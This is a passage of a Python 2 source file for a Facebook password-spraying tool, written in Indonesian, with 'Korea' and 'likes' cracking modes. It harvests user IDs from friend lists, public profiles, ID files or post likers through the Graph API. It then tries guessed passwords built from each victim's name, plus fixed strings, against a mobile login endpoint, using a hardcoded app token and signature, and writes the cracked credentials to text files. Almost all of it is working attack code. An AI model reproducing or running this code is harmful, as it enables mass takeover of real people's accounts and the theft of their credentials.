																			print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
																			print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos8
																			cek = open("done/thai.txt", "a")
																			cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos8+"\n")
																			cek.close()
																			cekpoint.append(zowe)
																			
		except:
			pass
			
	p = ThreadPool(30)
	p.map(main, id)
	print "\n\033[1;94m──────────────────────────────────────────────────"
	print '\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mSelesai ...'
	print"\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mTotal \033[1;92mOK\033[1;97m/\x1b[1;93mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print '\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mSalin hasil crack lalu simpan\033[1;91m : \033[1;97mdone thai.'
	print 50* "\033[1;94m─"
	raw_input("\033[1;97m(\033[1;91mKembali\033[1;97m) ")
	os.system("python2 Crack.py")
	
	### Crack korea ###
def crack_korea():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;97m(\033[1;91m!\033[1;97m) Token invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print " "
	print "\033[1;97m _________   ________.    "
	print "\033[1;97m \_   ___ \_/ ____\_ |__   \033[1;97m[\033[1;94m M\033[1;97m ]\033[1;94m > \033[1;97mMulti"
	print "\033[1;91m /    \  \/\   __\ | __ \  \033[1;97m[\033[1;94m B\033[1;97m ]\033[1;94m > \033[1;97mBrute"
	print "\033[1;94m \     \____|  |   | \_\ \ \033[1;97m[\033[1;94m F\033[1;97m ]\033[1;94m > \033[1;97mForce"
	print "\033[1;97m  \______  /|__|   |___  /"
	print "\033[1;97m         \/            \/ "
	print 50* "\033[1;94m─"
	print "\033[1;94m─────────────────────\033[1;97m(\033[1;93mKorea\033[1;97m)\033[1;94m──────────────────────"
	print 50* "\033[1;94m─"
	print "\033[1;94m(\033[1;97m1\033[1;94m) \033[1;97mCrack Dari Daftar Teman"
	print "\033[1;94m(\033[1;97m2\033[1;94m)\033[1;97m Crack Dari Id Teman/Publik"
	print "\033[1;94m(\033[1;97m3\033[1;94m)\033[1;97m Crack Dari File"
	print "\033[1;94m(\033[1;91m0\033[1;94m) \033[1;97mKembali"
	print 50* "\033[1;94m─"
	pilih_korea()

#### PILIH korea ####
def pilih_korea():
	teak = raw_input("\033[1;97m(?) Pilih \033[94m> \033[1;97m ")
	if teak =="":
		print"\033[1;97m(\033[1;91m!\033[1;97m) Isi Yg Benar Sayang!"
		pilih_korea()
	elif teak =="1" or teak =="01":
		os.system('clear')
		print " "
		print "\033[1;97m _________   ________.    "
		print "\033[1;97m \_   ___ \_/ ____\_ |__   \033[1;97m[\033[1;94m M\033[1;97m ]\033[1;94m > \033[1;97mMulti"
		print "\033[1;91m /    \  \/\   __\ | __ \  \033[1;97m[\033[1;94m B\033[1;97m ]\033[1;94m > \033[1;97mBrute"
		print "\033[1;94m \     \____|  |   | \_\ \ \033[1;97m[\033[1;94m F\033[1;97m ]\033[1;94m > \033[1;97mForce"
		print "\033[1;97m  \______  /|__|   |___  /"
		print "\033[1;97m         \/            \/ "
		print 50* "\033[1;94m─"
		print ("              \033[1;94m>>> \033[1;93mCRACK KOREA \033[1;94m<<<")
		print 50* "\033[1;94m─"
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif teak =="2" or teak =="02":
		os.system('clear')
		print " "
		print "\033[1;97m _________   ________.    "
		print "\033[1;97m \_   ___ \_/ ____\_ |__   \033[1;97m[\033[1;94m M\033[1;97m ]\033[1;94m > \033[1;97mMulti"
		print "\033[1;91m /    \  \/\   __\ | __ \  \033[1;97m[\033[1;94m B\033[1;97m ]\033[1;94m > \033[1;97mBrute"
		print "\033[1;94m \     \____|  |   | \_\ \ \033[1;97m[\033[1;94m F\033[1;97m ]\033[1;94m > \033[1;97mForce"
		print "\033[1;97m  \______  /|__|   |___  /"
		print "\033[1;97m         \/            \/ "
		print 50* "\033[1;94m─"
		print ("              \033[1;94m>>> \033[1;93mCRACK KOREA \033[1;94m<<<")
		print 50* "\033[1;94m─"
		idt = raw_input("\033[1;97m(\033[1;94m•\033[1;97m) ID Publik \033[1;91m:\033[1;97m ")
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			sp = json.loads(pok.text)
			print"\033[1;97m(\033[1;94m•\033[1;97m) Nama Akun \033[1;91m:\033[1;97m "+sp["name"]
		except KeyError:
			print"\033[1;97m(\033[1;91m!\033[1;97m) ID publik Tidak Ada!"
			raw_input("\n\033[1;97m(\033[1;91mKembali\033[1;97m)")
			crack_korea()
		except requests.exceptions.ConnectionError:
			print"\033[1;97m(\033[1;91m!\033[1;97m) Tidak ada koneksi !"
			keluar()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif teak =="3" or teak =="03":
		os.system('clear')
		print " "
		print "\033[1;97m _________   ________.    "
		print "\033[1;97m \_   ___ \_/ ____\_ |__   \033[1;97m[\033[1;94m M\033[1;97m ]\033[1;94m > \033[1;97mMulti"
		print "\033[1;91m /    \  \/\   __\ | __ \  \033[1;97m[\033[1;94m B\033[1;97m ]\033[1;94m > \033[1;97mBrute"
		print "\033[1;94m \     \____|  |   | \_\ \ \033[1;97m[\033[1;94m F\033[1;97m ]\033[1;94m > \033[1;97mForce"
		print "\033[1;97m  \______  /|__|   |___  /"
		print "\033[1;97m         \/            \/ "
		try:
			print 50* "\033[1;94m─"
			print ("              \033[1;94m>>> \033[1;93mCRACK KOREA \033[1;94m<<<")
			print 50* "\033[1;94m─"
			idlist = raw_input('\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mNama File\033[1;91m :\033[1;97m ')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except KeyError:
			print '\033[1;97m(\033[1;91m!\033[1;97m) File tidak ada ! '
			raw_input('\n\033[1;97m(\033[1;91mKembali \033[1;97m)')
		except IOError:
			print '\033[1;97m(\033[1;91m!\033[1;97m) File tidak ada !'
			raw_input("\n\033[1;97m(\033[1;91mKembali\033[1;97m)")
			crack_korea()
	elif teak =="0" or teak =="00":
		menu()
	else:
		print"\033[1;97m(\033[1;91m!\033[1;97m) Isi Yg Benar Sayang!"
		pilih_korea()
	
	print "\033[0;97m(\033[0;94m•\033[0;97m) Total ID\033[1;91m  :\033[1;97m "+str(len(id))
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[0;97m(\033[0;94m•\033[0;97m) Crack Berjalan "+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;94m──────────────────────────────────────────────────"
	print "\033[0;97m(\033[0;94m•\033[0;97m) UNTUK MENGHENTIKAN PROSES,TEKAN CTRL+Z PAHAM!\033[0m"
	print "\033[0;97m(\033[0;94m•\033[0;97m) TIDAK ADA HASIL GUNAKAN MODE PESAWAT 3 DETIK!\033[0m"
	print 50* "\033[1;94m─"
	
##### MAIN korea #####
	def main(arg):
		global cekpoint,oks
		zowe = arg
		try:
			sys.stdout.write("\r{}".format(datetime.now().strftime("\033[1;97m%H\033[1;97m:\033[1;97m%M\033[1;97m:\033[1;97m%S")));sys.stdout.flush()
			os.mkdir('done')
		except OSError:
			pass
		try:
			an = requests.get('https://graph.facebook.com/'+zowe+'/?access_token='+toket)
			j = json.loads(an.text)
			bos1 = j['first_name'].lower()+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			ko = json.load(data)
			if 'access_token' in ko:
				print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
				print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
				print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
				print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos1
				oke = open("done/korea.txt", "a")
				oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
				oke.close()
				oks.append(zowe)
			else:
				if 'www.facebook.com' in ko['error_msg']:
					print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
					print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
					print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
					print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos1
					cek = open("done/korea.txt", "a")
					cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
					cek.close()
					cekpoint.append(zowe)
				else:
					bos2 = j['first_name'].lower()+'12345'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					ko = json.load(data)
					if 'access_token' in ko:
						print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
						print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
						print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
						print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos2
						oke = open("done/korea.txt", "a")
						oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
						oke.close()
						oks.append(zowe)
					else:
						if 'www.facebook.com' in ko['error_msg']:
							print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
							print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
							print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
							print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos2
							cek = open("done/korea.txt", "a")
							cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
							cek.close()
							cekpoint.append(zowe)
						else:
							bos3 = j['first_name'].lower()+'1234'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							ko = json.load(data)
							if 'access_token' in ko:
								print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
								print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
								print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
								print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos3
								oke = open("done/korea.txt", "a")
								oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
								oke.close()
								oks.append(zowe)
							else:
								if 'www.facebook.com' in ko['error_msg']:
									print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
									print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
									print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
									print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos3
									cek = open("done/korea.txt", "a")
									cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
									cek.close()
									cekpoint.append(zowe)
								else:
									bos4 = ('salanghae')
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									ko = json.load(data)
									if 'access_token' in ko:
										print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
										print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
										print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
										print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos4
										oke = open("done/korea.txt", "a")
										oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
										oke.close()
										oks.append(zowe)
									else:
										if 'www.facebook.com' in ko['error_msg']:
											print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
											print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
											print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
											print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos4
											cek = open("done/korea.txt", "a")
											cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
											cek.close()
											cekpoint.append(zowe)
										else:
											bos5 = ('salanghae')
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											ko = json.load(data)
											if 'access_token' in ko:
												print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
												print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
												print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
												print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos5
												oke = open("done/korea.txt", "a")
												oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
												oke.close()
												oks.append(zowe)
											else:
												if 'www.facebook.com' in ko['error_msg']:
													print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
													print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
													print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
													print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos5
													cek = open("done/korea.txt", "a")
													cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
													cek.close()
													cekpoint.append(zowe)
												else:
													bos6 = j['first_name'].lower()+'123'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													ko = json.load(data)
													if 'access_token' in ko:
														print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
														print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
														print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
														print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos6
														oke = open("done/korea.txt", "a")
														oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos6+"\n")
														oke.close()
														oks.append(zowe)
													else:
														if 'www.facebook.com' in ko['error_msg']:
															print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
															print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
															print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
															print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos6
															cek = open("done/korea.txt", "a")
															cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos6+"\n")
															cek.close()
															cekpoint.append(zowe)
														else:
															bos7 = j['first_name'].lower()+'12345'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															ko = json.load(data)
															if 'access_token' in ko:
																print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
																print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
																print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
																print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos7
																oke = open("done/korea.txt", "a")
																oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos7+"\n")
																oke.close()
																oks.append(zowe)
															else:
																if 'www.facebook.com' in ko['error_msg']:
																	print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
																	print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
																	print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
																	print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos7
																	cek = open("done/korea.txt", "a")
																	cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos7+"\n")
																	cek.close()
																	cekpoint.append(zowe)
																else:
																	bos8 = j['last_name'].lower()+'1234'
																	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																	ko = json.load(data)
																	if 'access_token' in ko:
																		print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
																		print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
																		print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
																		print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos8
																		oke = open("done/korea.txt", "a")
																		oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos8+"\n")
																		oke.close()
																		oks.append(zowe)
																	else:
																		if 'www.facebook.com' in ko['error_msg']:
																			print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
																			print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
																			print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
																			print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos8
																			cek = open("done/korea.txt", "a")
																			cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos8+"\n")
																			cek.close()
																			cekpoint.append(zowe)
																			
		except:
			pass
			
	p = ThreadPool(30)
	p.map(main, id)
	print "\n\033[1;94m──────────────────────────────────────────────────"
	print '\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mSelesai ...'
	print"\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mTotal \033[1;92mOK\033[1;97m/\x1b[1;93mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print '\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mSalin hasil crack lalu simpan\033[1;91m : \033[1;97mdone korea.'
	print 50* "\033[1;94m─"
	raw_input("\033[1;97m(\033[1;91mKembali\033[1;97m) ")
	os.system("python2 Crack.py")
	
	
	
##### CRACK LIKES #####
def crack_likes():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;97m(\033[1;91m!\033[1;97m) Token Invalid!"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.system('clear')
		print " "
		print "\033[0;95m  ____           _   "
		print "\033[0;95m |  _ \ ___  ___| |_ \033[1;97m[\033[1;94m M\033[1;97m ]\033[1;94m > \033[1;97mMulti"
		print "\033[0;95m | |_) / _ \/ __| __|\033[1;97m[\033[1;94m B\033[1;97m ]\033[1;94m > \033[1;97mBrute"
		print "\033[0;95m |  __/ (_) \__ \ |_ \033[1;97m[\033[1;94m F\033[1;97m ]\033[1;94m > \033[1;97mForce"
		print "\033[0;95m |_|   \___/|___/\__| "
		print 50* "\033[1;94m─"
		print ("         \033[1;94m>>> \033[1;93mCRACK POSTINGAN TEMAN\033[1;94m <<<")
		print 50* "\033[1;94m─"
		tez = raw_input("\033[1;97m(\033[1;94m•\033[1;97m)\033[1;97m ID Postingan Teman \033[1;91m :\033[1;97m ")
		r = requests.get("https://graph.facebook.com/"+tez+"/likes?limit=9999999&access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
		jalan('\r\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mMengambil ID \033[1;94m...')
	except KeyError:
		print"\033[1;97m(\033[1;91m!\033[1;97m) ID Postingan Salah !"
		raw_input("\n\033[1;97m(\033[1;91mKembali\033[1;97m)")
		menu()
		
	print "\033[0;97m(\033[0;94m•\033[0;97m) Total ID\033[1;91m  :\033[1;97m "+str(len(id))
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[0;97m(\033[0;94m•\033[0;97m) Crack Berjalan "+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;94m──────────────────────────────────────────────────"
	print "\033[0;97m(\033[0;94m•\033[0;97m) UNTUK MENGHENTIKAN PROSES,TEKAN CTRL+Z PAHAM!\033[0m"
	print "\033[0;97m(\033[0;94m•\033[0;97m) TIDAK ADA HASIL GUNAKAN MODE PESAWAT 3 DETIK!\033[0m"
	print 50* "\033[1;94m─"
	
##### MAIN LIKES #####
	def main(arg):
		global cekpoint,oks
		zowe = arg
		try:
			sys.stdout.write("\r{}".format(datetime.now().strftime("\033[1;97m%H\033[1;97m:\033[1;97m%M\033[1;97m:\033[1;97m%S")));sys.stdout.flush()
			os.mkdir('done')
		except OSError:
			pass
		try:
			an = requests.get('https://graph.facebook.com/'+zowe+'/?access_token='+toket)
			j = json.loads(an.text)
			bos1 = j['first_name'].lower()+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			ko = json.load(data)
			if 'access_token' in ko:
				print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
				print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
				print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
				print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos1
				oke = open("done/post.txt", "a")
				oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
				oke.close()
				oks.append(zowe)
			else:
				if 'www.facebook.com' in ko['error_msg']:
					print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
					print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
					print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
					print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos1
					cek = open("done/post.txt", "a")
					cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
					cek.close()
					cekpoint.append(zowe)
				else:
					bos2 = j['first_name'].lower()+'12345'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					ko = json.load(data)
					if 'access_token' in ko:
						print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
						print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
						print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
						print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos2
						oke = open("done/post.txt", "a")
						oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
						oke.close()
						oks.append(zowe)
					else:
						if 'www.facebook.com' in ko['error_msg']:
							print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
							print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
							print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
							print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos2
							cek = open("done/post.txt", "a")
							cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
							cek.close()
							cekpoint.append(zowe)
						else:
							bos3 = j['first_name'].lower()+'1234'
